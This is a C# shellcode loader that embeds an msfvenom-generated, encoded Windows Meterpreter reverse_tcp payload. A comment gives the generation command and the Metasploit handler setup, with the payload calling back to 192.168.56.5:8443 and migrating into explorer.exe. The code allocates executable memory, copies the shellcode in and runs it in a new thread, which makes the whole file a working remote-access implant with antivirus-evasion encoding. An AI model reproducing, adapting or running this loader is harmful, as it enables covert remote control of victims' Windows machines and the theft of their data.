using System;
using System.Runtime.InteropServices;

/* msfvenom - a x86 - p windows / meterpreter / reverse_tcp LHOST = 192.168.56.5 LPORT = 8443 prependmigrate = true prependmigrateprocess = explorer.exe - f csharp - e x86 / shikata_ga_nai - i 10

msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <ip>
LHOST => <ip>
msf6 exploit(multi/handler) > set LPORT <port>
LPORT => <port>
msf6 exploit(multi/handler) > exploit

*/

namespace PayloadInjection
{
    class Program
    {
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttr, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 dwMillis);


        static void Main(string[] args)
        {
            byte[] buf = new byte[900] {
0xba,0x1b,0x3f,0x83,0x13,0xda,0xcd,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,
0xdb,0x31,0x56,0x13,0x03,0x56,0x13,0x83,0xc6,0x1f,0xdd,0x76,0xae,0x34,0x3d,
0xd5,0x9e,0x90,0xec,0xfc,0x55,0x00,0xfb,0xa4,0xa6,0x81,0xb2,0x8f,0xf8,0x7a,
0xa1,0x2c,0x90,0x68,0x4a,0xf1,0x62,0x59,0xa5,0x81,0xf3,0xee,0x0d,0xca,0x2e,
0xdc,0x90,0xd2,0x39,0xfa,0x1e,0xd3,0xdb,0x75,0x21,0xb0,0x95,0x14,0x1f,0xe5,
0x36,0xf4,0x1d,0xd7,0xb5,0x30,0xdc,0xf6,0xfa,0xd0,0x39,0xb9,0x9b,0xc5,0x30,
0xbe,0xbc,0xda,0x93,0x31,0x93,0x88,0x33,0xec,0xe7,0x9a,0x41,0x75,0xf4,0x47,
0x71,0x36,0x86,0x1d,0x62,0x73,0x74,0x54,0x14,0x7e,0xa8,0x45,0x34,0xc5,0xba,
0xc0,0x86,0x6e,0x21,0xc2,0x22,0xf2,0x57,0xec,0x5a,0x1e,0xbb,0x1c,0x5d,0x29,
0x43,0xd2,0xd5,0x30,0x23,0x5c,0x93,0xa9,0x18,0x8e,0xec,0x4e,0x8f,0x4b,0x91,
0xbf,0xbe,0x82,0x65,0xa4,0x15,0xda,0x8f,0xae,0x1b,0x6b,0x47,0x9f,0xe9,0xdb,
0x00,0x60,0xfe,0xdf,0xea,0x98,0xa4,0xca,0xa0,0x57,0x06,0xc1,0xd5,0x71,0x54,
0x37,0xb7,0xc3,0x38,0x26,0x4b,0xbd,0x8e,0xd5,0x68,0x90,0xf5,0xf3,0x35,0x80,
0x2b,0xb5,0x5c,0xae,0x04,0x96,0x0a,0x90,0x5e,0x29,0x42,0xa7,0x3e,0xde,0xb0,
0xe2,0xe8,0x03,0x8f,0x5d,0xef,0x31,0x55,0x0b,0xe1,0xbb,0x58,0x58,0x12,0x77,
0x13,0x20,0xcd,0xc0,0xf5,0x6f,0x56,0xe7,0x85,0xce,0xc4,0xd6,0xa1,0x73,0x9d,
0xda,0x24,0x7b,0x1d,0x63,0x70,0xad,0x82,0xf0,0xe1,0xc8,0xd5,0x5e,0x6e,0xb9,
0x4b,0x59,0xe1,0x79,0xbe,0x99,0x6c,0x16,0xac,0xe6,0x99,0xc9,0xec,0xa1,0x93,
0x64,0x2b,0x77,0xb2,0x75,0x03,0x06,0x0c,0xb5,0x44,0xb7,0xcd,0xbd,0xac,0x75,
0x8c,0xdc,0x7f,0x8d,0x69,0xda,0xff,0x16,0xf6,0xe6,0x0a,0xe4,0x61,0xba,0xb5,
0x66,0xff,0x2d,0xce,0xd7,0xe6,0x59,0x03,0x06,0xd7,0x2a,0xd8,0x5b,0x2f,0xef,
0x0d,0x04,0xa4,0xe9,0xbf,0x63,0x18,0x65,0x3d,0x8e,0x83,0x4e,0x48,0x8f,0x30,
0xab,0xad,0x71,0x7e,0x3f,0xf9,0x35,0xb1,0x5f,0x25,0x67,0xac,0xdb,0x4f,0x48,
0x03,0x5a,0xe4,0xaa,0xb7,0x63,0x58,0xd9,0x56,0x1c,0xba,0xb6,0x09,0x5b,0xe2,
0x74,0x17,0x93,0xab,0xa5,0x4a,0xb2,0x34,0x87,0x10,0x38,0x30,0xe4,0x05,0x09,
0xa1,0x23,0x72,0xae,0xfe,0xb2,0x3f,0xb9,0xed,0x31,0x6b,0xf4,0x26,0x5e,0x80,
0xf2,0xf1,0xa5,0x88,0xed,0x84,0x1a,0x27,0xf8,0x97,0x6b,0x90,0x28,0x0e,0x60,
0xec,0x78,0x10,0x77,0xac,0x8c,0x2a,0xc1,0xf0,0x20,0xab,0xfd,0x73,0xba,0xa0,
0xe1,0x76,0x0f,0x62,0xfa,0x81,0x72,0xc3,0xf5,0xf3,0xe7,0xd4,0x6f,0x77,0xbc,
0x48,0xa7,0x01,0xba,0xe6,0xee,0x24,0x4d,0xa3,0x88,0x9f,0x1e,0xd6,0x3b,0x02,
0x70,0xbf,0x5f,0x65,0x75,0x28,0x61,0xf0,0xcd,0xbf,0xa3,0x83,0xc5,0x19,0x04,
0x74,0xf0,0x2f,0xc6,0x6f,0x9b,0x4b,0x30,0x72,0xd6,0xf7,0xdc,0x0b,0xa7,0x00,
0xc0,0x09,0xfe,0x9b,0xb8,0x67,0x02,0x05,0x2a,0xb9,0xc9,0xdd,0x60,0xe5,0xe6,
0xb2,0x10,0xac,0xdc,0x9e,0xe4,0x11,0xf5,0xde,0xfc,0x53,0x37,0x97,0x95,0x0b,
0x13,0x0e,0x02,0x56,0x85,0x42,0x40,0x19,0xce,0x79,0xe8,0x87,0xef,0x5e,0x48,
0x14,0xbb,0xd5,0xaf,0xed,0xbd,0x49,0xd6,0x63,0xc9,0x94,0x63,0x94,0x95,0x6d,
0x15,0xd7,0x9e,0x96,0x16,0xe1,0x89,0x9b,0x31,0xad,0xdb,0xdc,0xa2,0x1e,0x07,
0xa9,0x21,0xea,0x35,0x3a,0xc5,0x70,0x15,0xd4,0x5e,0xa7,0x4d,0x95,0xc6,0x62,
0x7b,0xf7,0x2d,0xc1,0xbd,0x88,0xa2,0x70,0xc0,0x57,0x72,0x52,0xf0,0x52,0xc6,
0x81,0xdf,0x4a,0x8f,0x8b,0x37,0x73,0x2e,0x30,0xa1,0x51,0xd0,0xc1,0x99,0xf0,
0x27,0x2e,0xe3,0x8b,0xf1,0x00,0xc8,0xb3,0x81,0x25,0x2f,0x94,0x6f,0xa0,0x8d,
0xcd,0x37,0x25,0x21,0x3d,0xb3,0x06,0x5b,0x85,0x75,0x3f,0xf3,0xa5,0xd5,0x4c,
0x3b,0x01,0x9e,0x33,0xe7,0xff,0x35,0x2d,0x8c,0x58,0x1b,0x7e,0x31,0x17,0x59,
0xe5,0x47,0x3f,0x36,0xcd,0x3a,0xcd,0xf9,0x40,0xf6,0x59,0x2a,0x02,0x5d,0xea,
0xbc,0xf9,0xbf,0x1f,0x91,0x6e,0xc6,0xbc,0x9d,0x01,0xf9,0x50,0xf8,0xc9,0xbb,
0x72,0xe3,0x96,0x22,0x00,0xcc,0xe9,0x82,0x62,0x55,0x49,0x81,0x58,0x91,0x2e,
0x58,0xae,0x9d,0x69,0x94,0x8d,0xce,0xff,0xed,0x9d,0xa0,0x47,0x07,0x24,0x41,
0xa3,0xb2,0x24,0xf0,0xf0,0xf0,0x89,0x00,0xea,0xef,0x8a,0xe6,0x8b,0x3b,0x1a,
0x49,0xc9,0x65,0xbf,0xf4,0xc6,0x64,0x81,0x8b,0x6a,0x81,0xb8,0x61,0x97,0x98,
0x91,0xa8,0x36,0x00,0xce,0xb1,0x31,0xad,0xf9,0x64,0xfb,0xa0,0x99,0x65,0x5a,
0x2b,0x6c,0x85,0xf3,0xa4,0x84,0x5a,0x20,0x33,0xc5,0x8e,0xc0,0x71,0x6d,0x3b,
0x68,0xc4,0x11,0x8c,0x59,0xad,0xb5,0x30,0xae,0xc4,0x77,0x4e,0x12,0xa0,0x9b,
0xfd,0xa5,0x5e,0xfc,0x63,0x84,0x9c,0x37,0xd0,0xf0,0x82,0xd0,0xab,0xdb,0xb7,
0x26,0xd7,0x72,0xf5,0x86,0x54,0xfa,0x42,0x9b,0x70,0x6f,0xec,0x19,0x2a,0x66,
0xfd,0x2b,0xcd,0xa8,0xaf,0x6a,0x3f,0x2a,0xfc,0x1e,0x4b,0xf3,0x7f,0x48,0x6c,
0xb9,0x98,0x89,0x3e,0x9f,0x55,0x22,0x47,0xa0,0x47,0x95,0x50,0x9f,0x35,0xd3,
0x53,0x11,0x68,0xc3,0xf1,0x5b,0xf9,0x55,0x10,0xd0,0x98,0xbe,0xdb,0x1b,0x73,
0x0f,0x55,0x63,0x7d,0xfe,0x10,0xa1,0xfe,0xab,0x99,0x7e,0xe9,0xe5,0x48,0x39,
0xf1,0x88,0xd2,0x35,0x8d,0x9f,0x6a,0xce,0xd3,0xb9,0x7e,0x7b,0x02,0x71,0xdd,
0x69,0x0f,0x6b,0x88,0x4f,0x9f,0xdd,0x11,0xcb,0x1f,0xb8,0x94,0x48,0xf4,0x61 };


            UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            Marshal.Copy(buf, 0, (IntPtr)funcAddr, buf.Length);

            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;

            // get meterpreter session, payload configured to move into explorer.exe (prependmigrate=true prependmigrateprocess=explorer.exe)
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);

            WaitForSingleObject(hThread, 5000);
        }
    }
}
